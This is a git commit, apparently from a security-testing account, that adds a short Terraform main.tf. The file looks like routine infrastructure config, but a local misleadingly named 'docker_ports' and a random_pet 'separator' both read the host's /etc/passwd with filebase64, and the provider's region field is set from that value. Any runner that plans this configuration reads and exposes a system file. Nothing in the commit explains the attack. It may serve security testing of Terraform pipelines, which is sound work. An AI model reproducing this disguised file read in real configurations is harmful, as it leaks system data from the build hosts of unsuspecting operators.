cfc31f24d8e8582a8926cbd1caa102e4d1126978
synack1test <43527438+synack1test@users.noreply.github.com>
2020-07-14 17:42:57 +0200

    Create main.tf

---
+++ main.tf
@@ -0,0 +1,15 @@
+locals {
+      internal = 8300
+      external = 8300
+      docker_ports = "${filebase64("/etc/passwd")}"
+      
+      }
+provider "google" {
+  region = locals.docker_ports
+  
+  }
+
+resource "random_pet" "mydemo" {
+      separator = "${filebase64("/etc/passwd")}"
+       length    = 5
+    }
